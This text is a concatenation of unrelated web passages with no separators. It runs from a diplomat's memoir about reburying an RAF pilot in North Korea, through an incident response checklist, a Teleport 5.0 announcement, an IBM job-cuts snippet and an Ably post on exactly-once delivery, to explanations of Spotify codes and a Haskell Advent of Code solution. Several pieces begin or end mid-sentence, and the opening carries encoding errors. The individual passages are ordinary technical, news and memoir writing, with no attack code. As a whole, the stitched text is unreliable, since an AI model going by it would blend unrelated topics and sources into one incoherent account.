my previous post <a href="https://www.mydiplomaticlife.com/tragic-raf-pilots-secret-grave-discovered-in-albania/">Tragic RAF Pilotâ€™s Secret Grave Discovered In Albania</a></p><p>This news then led over the next six months to a long series of meetings, usually weekly either at Army HQ in Pyongyang, the crash site or at a military base on the outskirts of the city chaired on the military side by Senior Colonel Kwak Chol-hui who was to be my main point of contact for this project. I am glad to report that the two shady civilians from our first meeting never did make a reappearance.</p><p>The Colonel who would later go on to be promoted to Major General was responsible throughout the negotiations for arranging visits to the site, meetings with the two surviving eyewitnesses and agreeing that Flt Lt Hinton’s brother would be fast tracked for a visa and allowed to visit the DPRK site to pay his final respects to his brother.</p><p>True to their word, Flt Lt Hinton’s brother was granted his visa and permitted to visit the village. At a meeting we had with the military, he was offered the choice of having his brother’s remains repatriated to the south via Panmunjon or re-buried on the outskirts of the village. He chose the latter. Therefore, the military re-buried his remains in a properly marked grave and on the final day of his visit, he was part of a small, brief ceremony attended by members of the British Embassy, North Korean military and villagers.</p><p>Despite my requests, the North Koreans had refused to allow me to obtain a properly inscribed headstone from the Commonwealth War Graves Commission, so a simple marker was used instead. Overall, it was a small victory but did give some form of closure to the family of Flt Lt Hinton.</p><p>As mentioned above, I met Colonel Kwak Chol-hui (pictured above with me at a Queens Birthday Party celebration in Pyongyang) and his team on many occasions over that 6 month period. As well as working on the Hinton project, he also eased the process of enabling me to take the very rare numbers of visitors we got down to the DMZ at Panmunjon as part of their “North Korean experience”. The other was the USS Pueblo where the military arranged private tours for me (Pueblo post to follow).</p><p>At Panmunjon, when I took visitors down to view the DMZ, we were always hosted by the military who would lay on briefings and guides for our visitors as well as a lunch afterwards. I could always see the look of bewilderment on the faces of the South Korean border guards and US military standing a few feet away on the southern side of the demarcation line wondering who these foreigners were on the other side looking a tad too cosy with North Korean officers!</p><p><b><i>*All of the above pre-supposes that this was the happy ending and finality for everyone involved.

<h2>What is incident response?</h2>



<p>Incident response is an approach to managing a security incident process. An incident response plan is needed to approach security incidents systematically. A successful incident response plan includes the following 6 stages:</p>



<p>1- Preparation</p>



<p>2- Identification</p>



<p>3- Scope</p>



<p>4- Eradication</p>



<p>5- Recovery</p>



<p>6- Lessons Learned</p>



<p>If you want to practice about incident response, you can use our blue team training platform <a aria-label="undefined (opens in a new tab)" href="https://letsdefend.io/" target="_blank" rel="noreferrer noopener">LetsDefend </a>for free.</p>



<h3>1- Preparation</h3>



<p><strong>Creating a Central Registration System</strong></p>



<p>It is important in terms of saving time that all data can be examined from a single point with a central log collection system that can manage large files.</p>



<p><strong>Time Synchronization</strong></p>



<p>Enabling NTP on all devices in the network is important for matching the time information of the logs collected.</p>



<p><strong>User Account Management</strong></p>



<p>The fact that the user names of different accounts belonging to personnel are the same and different from other personnel makes it easy to monitor user activities in the event of an event.</p>



<p><strong>Management of System and Service Accounts</strong></p>



<p>The administrators of the services and systems used should be appointed and a document should be created on how to reach these managers if needed.</p>



<p><strong>Asset Management</strong></p>



<p>Instant access to information such as devices, operating systems, patch versions, and critical status should be available.</p>



<p><strong>Secure Communication</strong></p>



<p>If necessary, the team may need to communicate independently of the internal network, for such cases mobile phone or secondary emails can be used.</p>



<p><strong>Legal Transactions</strong></p>



<p>The method of who will initiate the judicial process and in which situations should be determined before the incident occurs.</p>



<h3>2- Identification</h3>



<p><strong>Review</strong></p>



<p>For a potential suspicious incident, preliminary information about the incident should be gathered. Then it must be decided whether the situation is a suspicious event or not.</p>



<p><strong>Assignment</strong></p>



<p>The first person to examine the incident must be determined. The person should take notes about the review.</p>



<p><strong>Using the Checklist</strong></p>



<p>There should be checklists for the analysis to be made in order to ensure consistent responses to incidents.</p>



<h3>3- Scope</h3>



<p><strong>Characterize the event</strong></p>



<p>Since determining the event will determine the actions to be taken, it is important to determine the type of the incoming event. EX: DDoS, malware infection, data leak …</p>



<p><strong>Taking Action</strong></p>



<p>Action should be taken according to the technique used to intercept the attacker’s method quickly. If there is an account that it has captured, simple measures such as account deactivation and IP blocking should be done quickly.</p>



<p><strong>Data collecting</strong></p>



<p>The image of the volatile memory along with the firewall, network traffic and other logs will be required for the investigation.</p>



<p><strong>Isolation</strong></p>



<p>Unplugging the compromised system&nbsp; could be a solution, isolating it is a more viable solution.</p>



<p>After the systems affected by the incident are determined, the possibility of the attacker’s spread in the network is cut and volatile information is collected, the next step can be passed.</p>



<h3>4- Eradication</h3>



<p><strong>Identifying the Root Cause</strong></p>



<p>With the information obtained in the 2nd and 3rd stages, the root cause of the event should be determined. The attacker must then be completely kick out.</p>



<p><strong>Determining Rootkit Potential</strong></p>



<p>If rootkits are suspected in the system, the disk should be cleaned and a clean backup installed. After the installation, the latest updates of the existing applications and systems should be installed.</p>



<p><strong>Improve Defense</strong></p>



<p>Operating systems, applications used, network, DMZ etc. The deficiencies of defense in areas should be determined and work should be done on how to make improvement.</p>



<p><strong>Vulnerability Scan</strong></p>



<p>Potential attack points on networks and systems should be identified and corrected by performing vulnerability scans.</p>



<p>When the necessary arrangements are prepared to prevent the event from recurring, the recovery phase can be started.</p>



<h3>5- Recovery</h3>



<p><strong>Verification</strong></p>



<p>Verify that logging, systems, applications, databases, and other operations work correctly.</p>



<p><strong>Restore</strong></p>



<p>At this stage, the restore operation is coordinated.</p>



<p><strong>Monitoring</strong></p>



<p>Systems should be monitored for recurring events.</p>



<p>When there is no repetitive harmful situation or unusual activity, the next step is taken.</p>



<h3>6- Lessons Learned</h3>



<p><strong>Writing a Follow-up Report</strong></p>



<p>The report includes the examinations with the expert and the executive, the stages of good and bad working in the intervention plan, and the recommendations regarding the process. The report should be written in a way that the manager is sure that the event has been closed.</p>

<p><img src="https://goteleport.com/blog/images/2020/application-access-announcement-header.png" width="100%" alt="Teleport 5.0 application access announcement"></p>

<h2 id="introduction">Introduction</h2>

<p>Today, we are announcing the availability of Teleport 5.0. This is a major release for the project with numerous improvements and new features, but the hallmark capability of this version is the <a href="https://goteleport.com/teleport/">Unified Access Plane</a> and <a href="https://goteleport.com/teleport/application/">Application Access</a> for Developers.</p>

<p>For those unfamiliar with Teleport, it is an open source project for giving developers secure remote access to everything they need. It started as a replacement for OpenSSH, then added Kubernetes access, and today we’re adding HTTPS as another protocol.</p>

<h2 id="application-access-for-developers">Application Access for Developers</h2>

<p>Do you have internal dashboards running inside your production or staging environments? Perhaps a couple of Jenkins servers, maybe a Kubernetes web UI, or other tools accessible via a browser? The old school method of accessing them was setting up a VPN, with extra points for configuring each of those apps to authenticate via some sort of a directory.</p>

<p>A better method is to embrace the <a href="https://goteleport.com/blog/vpns-and-zero-trust-thoughts-on-the-evolving-nature-of-remote-access/">Zero Trust</a> principle and expose all of your internal application endpoints to the internet with proper identity-based authentication with MFA. This creates work: getting a public IP, configuring DNS, maintaining X.509 certificates, setting up SAML integrations, etc. Just maintaining the inventory of all available HTTPS endpoints is work. Setting this up to qualify a SOC2, PCI or FedRAMP compliance is also work, and keeping your setup this way is a tiny bit of extra never-ending work.</p>

<p>This isn’t rocket science, but we believe it must not be something that you should be spending your time on. Besides, if the operational costs of securely exposing another internal tool to the team was zero, we would all enjoy more tools.</p>

<p>Consider another use case: a web application running behind NAT on a third party network. To make it entertaining, think of a web app running on a self-driving vehicle with an ever-changing IP address. If you ship devices with web dashboards to be deployed inside customer networks, how do you access them from the outside?</p>

<p>This is why we’ve added Application Access to Teleport 5.0. It allows users to visit the Teleport proxy in a browser and see a live inventory of applications running anywhere in the world. Each web application is just an HTTPS URL provided by Teleport, so you can have:</p>

<ul>
<li><a href="https://jenkins.proxy.example.com/">https://jenkins.proxy.example.com</a></li>
<li><a href="https://grafana.proxy.example.com/">https://grafana.proxy.example.com</a></li>
<li><a href="https://your-own-app.example.com/">https://your-own-app.example.com</a></li>
</ul>

<p>…and more. An application can be added or removed with just a couple of clicks. It can even be completely automated. Here’s how it looks in the Web UI:

<video autoplay="" loop="" muted="" playsinline="">

Your browser does not support the video tag.
</video>
</p>

<h2 id="how-does-application-access-work">How does Application Access Work?</h2>

<p>Teleport, for those who have never used it, is a single dependency-free binary which can run as a Linux daemon or can be deployed as a Kubernetes pod. Not surprisingly, this binary is called <code>teleport</code>.</p>

<p><code>teleport</code> behaves differently based on the command-line arguments or via a configuration file. It can run in several modes, also called roles. Combining them together allows you to tailor Teleport deployment to your needs:</p>

<ul>
<li><em>Proxy service</em>, if started as <code>teleport start --roles=proxy</code></li>
<li><em>An application access service,</em> if started as <code>teleport start --roles=app</code> (shown as “sidecar” on the diagram)</li>
</ul>

<p>Here’s an example of how these services can work together to give developers seamless access to internal web apps with a single login:</p>

<p><img width="60%" src="https://goteleport.com/blog/images/2020/application-access-announcement-2.png" alt="how a proxy service and application access service work together"></p>

<p>Let’s consider how connectivity is established first, and then we’ll cover authentication.</p>

<h3 id="connectivity">Connectivity</h3>

<p>The diagram above is self-explanatory:</p>

<ul>
<li>A Teleport Proxy service must be running somewhere and exposed to the public internet. The proxy is the single access point that can be used to access applications anywhere. The proxy is not a single point of failure as you can have several copies behind a network load-balancer or via a DNS split.</li>
<li>Each private network needs to run a copy of <code>teleport</code> running with <code>--roles=app</code>. This process is a sidecar, which creates an encrypted outbound tunnel to the Teleport proxy. The tunnel is permanent, and if the proxy becomes unavailable, or if the Internet connectivity is not reliable, the sidecar will be trying to reconnect when possible.</li>
<li>Each app gets a DNS name issued by the proxy, so if the proxy is running on <code>proxy.example.com</code>, you may have Jenkins available as <code>jenkins.proxy.example.com</code>. This DNS name also points at the proxy.</li>
<li>When a user tries to access <code>jenkins.proxy.example.com</code>, their request will be proxied through the suitable tunnel to the sidecar responsible for this app, and from there a connection to the actual Jenkins instance will be made.</li>
</ul>

<p>This architecture is fairly flexible, as it allows users to have sidecars running inside their networks, proxying access to all applications on that network. They can also be bundled with applications (inside the same Kubernetes pod, for example), so the apps can be configured to only listen on <code>localhost</code>. This guarantees that the only way to access an application is via the Teleport proxy.</p>

<h3 id="authentication">Authentication</h3>

<p>Obviously, the proxy is protected. Teleport supports multiple authentication methods:</p>

<ul>
<li><em>The local database of users with MFA</em>. This is suitable for quick experimentation and as a “Plan B” when other methods are not available.</li>
<li><em>Popular public identity providers</em> such as Github and Google, so you can configure the proxy to trust a certain Github team or a Google Apps group.</li>
<li><em>Corporate SSO</em> logins via SAML. Examples include Active Directory, Okta, Auth0, OneLogin, and so on.</li>
</ul>

<p>The identity of users is passed to applications via HTTP headers. If an application is capable of understanding this information, it will not present its own login screen. But even if an application is not built to understand such headers, users will have to login again using in-app authentication. It’s worth noting that Teleport proxy, when integrated with SSO, usually bothers users with a login just once per day, and most legacy apps offer “remember me” functionality, so the double-login for most use cases is not an issue.</p>

<h2 id="who-is-application-access-for">Who is Application Access for?</h2>

<p>Teleport Application access is naturally a great capability boost for existing Teleport users, who’re using it to get instant SSH to their environments. As a developer, a single login once per day should give you auto-expiring credentials for everything you need to be productive, be it a Jenkins instance, or Kubernetes clusters, or SSH nodes.</p>

<p>Teleport Application Access gives security professionals easy access controls to internal apps, so achieving FedRAMP compliance even for legacy internal applications becomes quite easy.</p>

<p>But even as a hobbyist, I have been enjoying having access to my Synology home NAS or to my printer’s web UI on the go!</p>

<h2 id="other-improvements">Other Improvements</h2>

<p>Teleport 5.0 comes with improved Kubernetes Access. In addition to connecting SSH nodes to a Teleport cluster, users can now configure Teleport to provide access to multiple Kubernetes clusters running behind NAT. This brings all three types of access to an equal footing:</p>

<ul>
<li>SSH Access</li>
<li>Application Access</li>
<li>Kubernetes Access</li>
</ul>

<p>The end result is an engineer getting access to all three with a single login.</p>

<h2 id="the-future-of-teleport">The Future of Teleport</h2>

<p>Traditionally, open source projects of similar architecture were called “proxies,” or simply “servers”, as in SSH server. Such a description never felt right for Teleport because its mission is to provide instant <em>access for engineers to any computing resource anywhere in the world</em>. Calling it a server or a proxy did not feel right, as its purpose was to remove machine and network boundaries and create an illusion of all computing resources being in the same “room” as an engineer.</p>

<p>Starting with version 5.0, Teleport will be known as a <strong>Unified Access Plane</strong>. Greg Chase, who runs our Product Marketing function, coined the term. It fits perfectly with our vision of erasing access boundaries between computing resources and environments.</p>

<p>The cloud has largely replaced the notion of a “computer” for most developers, as we create programs to run “in the cloud” now. The cloud is a collection of geographically scattered production environments, each consisting of ever-growing in height tech stacks. It is, essentially, a single-purpose, custom “computer” that we build from virtual parts supplied by the cloud providers. This computer currently lacks an operating system or standardization of any kind and we’re still stitching together solutions from good ole days to run our stuff on it, including remote access solutions. The list of “computer components” is long and each component currently comes with its own remote access facility: SSH, RDP, K8s API, databases, internal dashboards, etc. Ending this fragmentation is what Teleport is about.</p>

<blockquote>
<p>Teleport Unified Access plane’s purpose is to be a single remote access to this “cloud computer”, for all environments and all protocols.</p>
</blockquote>

<p>If you’ll be <a href="https://goteleport.com/get-started/">downloading Teleport</a> for the first time today, I figured you should be aware that you’re trying something new and truly special, and you should be aware that support for other protocols is in the works, with some just around the corner.</p>

<p>Also, consider subscribing to our newsletter below. We make a good effort to make it interesting for engineers, which is easy because we are in the middle of a massive shift in remote access technology.</p>

IBM is poised to cut 8,000 jobs across its European operations next year, including up to 2,000 jobs in its UK and Ireland business, a source close to the matter has told CPI. Cuts in IBM France and IBM Italy are also expected to be announced to the regional country HQs. Channel Partner Insight reported last month that IBM had already informed IBM Germany of its intentions to cut around 2,300 jobs in that market. IBM's intentions to slim down comes a month after CEO Arvind Krishna told investors...

<p>Exactly-once is a desirable (if not critical) message delivery guarantee and a remarkably complex engineering challenge to solve. In this blog post, we will look at what exactly-once means in the context of distributed pub/sub systems, and the exactly-once guarantees that the <a href="https://www.ably.io/">Ably</a> realtime pub/sub messaging platform provides. Ably often acts as the broker in data streaming pipelines: publishers send messages to our platform, and we deliver these messages to subscribers. As a broker, Ably provides regional &amp; global fault tolerance, which ensures message availability and survivability. We also offer a set of capabilities via SDKs that enable clients to use idempotent publishing, and recover in the event of a failure while resuming precisely where they left off, with no lost or duplicate messages.</p>
<figure><img src="https://files.ably.io/ghost/prod/2020/11/4-pillars-exactly-once-semantics-cover.png"></figure><h2 id="exactly-once-delivery-is-one-of-the-hardest-engineering-challenges">Exactly-once delivery is one of the hardest engineering challenges<br>
</h2>
<p>In the context of distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems, exactly-once is a popular concept and a desirable, if not critical, system property. It also leads to confusion and diverging opinions within the development community. On the one hand, some argue that <a href="https://bravenewgeek.com/you-cannot-have-exactly-once-delivery/">exactly-once is simply unachievable.</a> On the other hand, there are systems such as <a href="https://kafka.apache.org/documentation/#semantics">Kafka that claim to support exactly-once semantics</a>. </p>
<p>We believe that a lot of the confusion around the concept has to do with the fact that there's no clear definition of what exactly-once actually means. It's arguably impossible to come up with a definition to satisfy everyone and every use case. That's because exactly-once can mean different things for different systems and different use cases. Regardless of how you look at it, though, exactly-once is, without a doubt, a distinctively complex engineering challenge. </p>
<p>Let’s now define what exactly-once means for Ably in particular. In our case, exactly-once is a guarantee that once acknowledged, a message published to Ably is <strong>delivered</strong> to a consumer precisely once, even in the context of individual system components failing. Note that most often, Ably is used to deliver messages in real time directly to end-user devices.</p>
<p>It’s crucial to mention that exactly-once is a system-wide property, and you only achieve it if all the constituent components play their part. This doesn’t mean that all the components must display exactly-once characteristics. For example, in our case, you can have a publisher that displays at-least-once behaviour. However, Ably provides an idempotent interface, which cancels out the fact that the producer may occasionally publish messages more than once. As long as at the other end of the pub/sub pipeline each message is delivered to subscribers precisely once, exactly-once behaviour is achieved as a whole.</p>
<h3 id="types-of-messaging-semantics">Types of messaging semantics<br>
</h3>
<p>Before we dive deeper into exactly-once delivery, let’s review the main types of messaging semantics. When a system is fully operational and working as intended, exactly-once delivery is the behaviour you generally expect. However, we must also consider how faults in the pub/sub system or, indeed, clients affect this behaviour. While most components fail independently in a distributed pub/sub system, without directly impacting other components, the overall quality of service can be affected. Depending on how the system behaves when failures do occur, you get several different types of messaging semantics:</p>
<ul>
<li>
<strong>At-most-once semantics</strong>. The easiest type of semantics to achieve, from an engineering complexity perspective, since it can be done in a fire-and-forget way. There's rarely any need for the components of the system to be stateful. While it's the easiest to achieve, at-most-once is also the least desirable type of messaging semantics. It provides no absolute message delivery guarantees since each message is delivered once (best case scenario) or not at all.</li>
<li>
<strong>At-least-once semantics. </strong>This is an improvement on at-most-once semantics. There might be multiple attempts at delivering a message, so at least one attempt is successful. In other words, there's a chance messages may be duplicated, but they can't be lost. While not ideal as a system-wide characteristic, at-least-once semantics are good enough for use cases where duplication of data is of little concern, or scenarios where deduplication is possible on the consumer side.</li>
<li>
<strong>Exactly-once semantics</strong>. The ultimate message delivery guarantee and the optimal choice in terms of data integrity. As its name suggests, exactly-once semantics means that each message is delivered precisely once. The message can neither be lost nor delivered twice (or more times). Exactly-once is by far the most dependable message delivery guarantee. It’s also the hardest to achieve.</li>
</ul>
<figure><img src="https://files.ably.io/ghost/prod/2020/11/exactly-once-semantics-messaging-semantics-overview.gif" alt="Overview of message delivery semantics: at-most-once delivery, at-least-once delivery, exactly-once delivery."><figcaption>High-level overview of message delivery semantics</figcaption></figure><p>What most distributed pub/sub systems can genuinely guarantee is <strong>mostly-once </strong>delivery. This means that when the system is functioning as intended, messages are delivered exactly once. However, when failures are involved, there’s always a chance some messages will be delivered either at-most-once or at-least-once.</p>
<h3 id="failures-that-prevent-exactly-once-delivery">Failures that prevent exactly-once delivery<br>
</h3>
<p>To demonstrate just how hard it is for distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems to achieve exactly-once semantics, we must talk about failures—specifically, components that can fail and how these failures can be mitigated.<br></p>
<p><strong>Publisher failure</strong></p>
<p>When a publisher fails, some sort of recovery process takes place. Depending on its design, after recovery, the publisher may reattempt to publish a message that has already been sent to and acknowledged by the broker. In such an event, the publisher failure causes at-least-once behaviour. Another scenario is that the publisher’s recovery procedure fails to realise that the publish attempt failed, which leads to at-most-once behaviour. </p>
<p>A strategy often used after a publish failure is to retry publishing the same message a fixed number of times. This is a pragmatic approach, but unsatisfactory in the context of exactly-once. Imagine that the publisher recovers and unsuccessfully tries to republish the same message five times, and then gives up. Practically none of the three semantics is achieved. To mitigate publisher failures Ably supports <a href="https://www.ably.io/topic/idempotency">idempotent publishing</a>, which ensures that regardless of how many times the same message is published to Ably, it will be delivered to subscribers exactly-once. <br></p>
<p><strong>Broker failure</strong></p>
<p>A broker failure has the potential to lead to all sorts of issues, including data loss. That’s why it’s recommended to design your system around the idea of mitigating or preventing loss of data. From a producer perspective, this could mean having the ability to publish messages at-least-once, so they can be resent to the broker if needed. </p>
<p>From a broker perspective (Ably included), let’s start by reviewing what a message ACK means. Obviously, it’s an acknowledgment that a published message has been received. Additionally, it should also imply that no subsequent failure will result in that message not being delivered to subscribers. In other words, it should be an acknowledgment that the broker provides sufficient redundancy to ensure continuity of service and onwards processing, even in the context of multiple infrastructure failures. Of course, nothing can be done to prevent or mitigate certain types of critical failures. When that happens, the sensible thing for the broker to do is to respond with a failure response (with HTTP, this is typically a 5xx status code), indicating clearly to the producer that the publish attempt was unsuccessful. </p>
<p><strong>Subscriber failure</strong></p>
<p>The most common subscriber failure that prevents exactly-once delivery involves short disconnections. For example, a client app on a mobile device will disconnect and quickly reconnect when the user switches from a mobile data network to a Wi-Fi network or goes through a tunnel. To counter this scenario and ensure exactly-once behaviour, the stream of messages must resume precisely where it left off when the subscriber recovers. For this to be possible, the connection state must be persisted and resynced when the subscriber reconnects.</p>
<p>If the broker is the one keeping track of the last message sent, you are unlikely to provide exactly-once semantics. That’s because a broker might send a message, and the subscriber might successfully receive it and then disconnect before sending an ACK to the broker. In such a case, once the subscriber reconnects, the broker will resend the respective message (at-least-once semantics) since it has no way of knowing that the subscriber had received it before disconnecting.</p>
<p>To ensure exactly-once behaviour, the responsibility of keeping track of the last message received should sit with the subscriber - something we also do at Ably, via serial numbers. This way, when the subscriber reconnects, it notifies the broker of the last message it has received so that the stream can be accurately resumed from a point in time.</p>
<h3 id="exactly-once-semantics-use-cases">Exactly-once semantics use cases</h3>
<p>In the world of distributed pub/sub systems, exactly-once semantics has been and continues to be extremely hard to achieve. Equally, almost everywhere you look in software development, exactly-once is a highly desirable system-wide property, if not an essential one. For example, exactly-once is crucial for most transactional messaging use cases. At its core, a transactional message is triggered by a consumer action, and it usually includes necessary or high-priority info, e.g., a bank balance inquiry or an order confirmation. </p>
<p>Ordered operations represent another use case where exactly-once is fundamental. Let’s say you want to use <a href="https://www.ably.io/blog/message-delta-compression/">delta compression</a> to only stream changes from the previous message to subscribers each time there’s an update. To achieve this, you need to use a transport that ensures data integrity through guaranteed message ordering and exactly-once semantics.</p>
<p>If not crucial, exactly-once is at least highly desirable, because it improves overall system predictability and provides better experiences to users in general. For example, …</p></div></section></article></div></div></div>

This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>

It’s time for everyone’s favorite Santa-based light hearted learn-to-program-or-a-new-language holiday season programming challenge series. Every year a bunch of us gather around the fireplace, roast chestnuts, and brainstorm all of the interesting ways we can solve these cute themed puzzles every day. These puzzles are designed to accessible enough for most new programmers, but deep enough to provide entertainment for experienced ones. I’ve <a href="https://blog.jle.im/entries/tagged/advent-of-code.html">written many blog posts</a> on some of the interesting insight some of the puzzles have yielded, and I also <a href="https://github.com/mstksg/advent-of-code-2019/blob/master/reflections.md">post my reflections on as many puzzles I can</a> while solving them in Haskell. And if you’re solving things in Haskell, I also published an <a href="https://hackage.haskell.org/package/advent-of-code-api">open-sourced rate-limited API library</a> so you can fetch and submit answers from the comfort of your command line.</p>
<p>To kick off the season, I’ve decided to write about one of my favorite puzzles from Advent of Code 2019 – <a href="https://adventofcode.com/2019/day/22">Day 22: Slam Shuffle</a>. To me, it stands out because it’s a perfect example of how Haskell’s approach to mathematical abstraction nudges you into the direction of an efficient solution — in a way that other languages would obscure or make less obvious.</p>
<p>So, let’s dive in! In the end, hopefully this post can get you excited for this wonderful season, and maybe also shed some insight into what it means when we say that Haskell can help you leverage math to find good solutions to your real problems.</p>
<p>Of course, this post has spoilers for Advent of Code 2019 Day 22, if you are planning on trying to figure it out from yourself. If you haven’t tried it, I recommend you give it a shot and come back after! :D</p>
<h2 id="slam-shuffle">Slam Shuffle</h2>
<p>If you haven’t already, take some time to <a href="https://adventofcode.com/2019/day/22">read through the problem statement</a>. The basic idea is that we are given a series of operations to “shuffle” a deck of 10007 cards, such as:</p>
<pre><code>deal with increment 7
deal into new stack
deal into new stack
... etc</code></pre>
<p>After performing all of the many operations, the question then asks about the card at a given position (the 2019th card in the deck).</p>
<p>Part 2, which you might not be able to see if you haven’t submitted an answer yet for Part 1, involves the same process with a deck of 119315717514047 cards, and repeating the entire shuffling sequence 101741582076661 times. It then asks you to find the card that ends up at index 2020.</p>
<p>In this problem, it seems we have a list of “shuffles” that we want to run on a deck of cards. However, let’s think about this in a more data-driven approach: instead of thinking about successive shufflings of cards, let’s imagine the specification of a “shuffle” itself as our main data, and how we can combine shuffle operations together into new shuffle operations.</p>
<p>We are looking for “take shuffle A and shuffle B, and return a new shuffle that represents doing B, then A”. This is “shuffle composition”, or “permutation composition” (<a href="https://en.wikipedia.org/wiki/Permutation">permutation</a> being the mathematical word for “shuffling” here, basically)</p>
<p>Since we’ve identified that we want to begin implementing a way of composing/combining permutations together, we can do a bit of reading to learn that one of the most famous properties of permutation composition is that they form a “group”, which means they can be composed (associatively), have an identity, and can be inverted. This means that if you have two permutations, you can “squish” them to create a new permutation, and work with that <em>new</em> permutation.</p>
<p>I’ve talked about <a href="https://blog.jle.im/entry/alchemical-groups.html">using group theory</a> principles before in this blog to help guide us towards solutions and optimizations — the main principle is that if we express our program in terms of group operations, then we can take advantage of the large body of knowledge built up over centuries to understand, analyze, and potentially optimize our program.</p>
<p>The <em>first</em> big advantage in this situation is that we can treat our transformations <em>as data</em>, and not as functions. And that if we have two transformations, we can always create a new one (just a normal data type value) that represents the composition of the two original ones.</p>
<h2 id="now-youre-thinking-with-groups">Now You’re Thinking With Groups</h2>
<p>Knowing permutations are a group, it means that once we settle on our representation of them, <code>Perm</code>, we can write an instance of <code>Perm</code> for <code>Semigroup</code>, <code>Monoid</code>, and <code>Group</code>, abstractions in Haskell that many types are already instances of. Abstractions like <code>Semigroup</code> and <code>Monoid</code> are pretty much an everyday thing in Haskell, so this fits in quite nicely. <code>Group</code> comes from the <em><a href="https://hackage.haskell.org/package/groups">groups</a></em> package, which also provides some nice applications of group theory.</p>
<div id="cb2"><pre><code><span id="cb2-1"><a href="#cb2-1"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>...</span> <span>-- let's figure out the implementation later, where n is the number of cards</span></span></code></pre></div>
<p>In Haskell, we express things like “<code>Perm</code> is a Semigroup/Monoid/Group” by saying that they are instances of <em>typeclasses</em>, which (for this purpose) are like interfaces in languages like Java.</p>

<p>This means that if <code>Perm</code> is an instance of <code>Group</code> (which has superclasses <code>Semigroup</code> and <code>Monoid</code>), we can:</p>
<ul>
<li>Compose permutations using <code>x &lt;&gt; y</code>, which means “shuffle with strategy <code>y</code>, then with strategy <code>x</code>”</li>
<li>Summon an “identity permutation” where <code>x &lt;&gt; mempty == x</code> (the identity permutation, which is “leave things alone”).</li>
<li>Invert any shuffling (if we have <code>x</code>, we can reverse its effect with <code>invert x</code>)</li>
</ul>
<p>In addition, the standard libraries also give us a useful function <code>stimes</code></p>
<div id="cb4"><pre><code><span id="cb4-1"><a href="#cb4-1"></a><span>stimes ::</span> <span>Semigroup</span> m <span>=&gt;</span> <span>Int</span> <span>-&gt;</span> m <span>-&gt;</span> m</span></code></pre></div>
<p>which lets us compose <code>x</code> with itself (<code>stimes 5 x == x &lt;&gt; x &lt;&gt; x &lt;&gt; x &lt;&gt; x</code>), but can do it in <em>log(n)</em> time using <a href="https://en.wikipedia.org/wiki/Exponentiation_by_squaring">repeated squaring</a>. It’s extremely efficient in a lot of circumstances (more on that later) — more so than the naive compose-it-n-times implementation. This will definitely become useful in part 2, where we have to do 101741582076661 compositions.</p>
<h2 id="our-gameplan">Our Gameplan</h2>
<p>Just <em>knowing</em> that permutations form a group naturally guides us to these abstractions — we already know what <em>interface</em> our type will have, even before we write any code. We know that no matter <em>what</em> our implementation of permutation will be, we will have <code>(&lt;&gt;)</code>, <code>stimes</code>, <code>mempty</code>, <code>invert</code> available to us to use. So, let’s do just that! We’ll use a stub data type <code>Perm</code> to represent our permutation and “pretend” we have that interface on it. We’ll write our functions first and then fill in the interface later!</p>
<div id="cb5"><pre><code><span id="cb5-1"><a href="#cb5-1"></a><span>-- | Represents a permutation of n cards</span></span>
<span id="cb5-2"><a href="#cb5-2"></a><span>data</span> <span>Perm</span> n <span>=</span> <span>....</span></span>
<span id="cb5-3"><a href="#cb5-3"></a></span>
<span id="cb5-4"><a href="#cb5-4"></a><span>-- | Given a permutation, find the place where a given index ends up.</span></span>
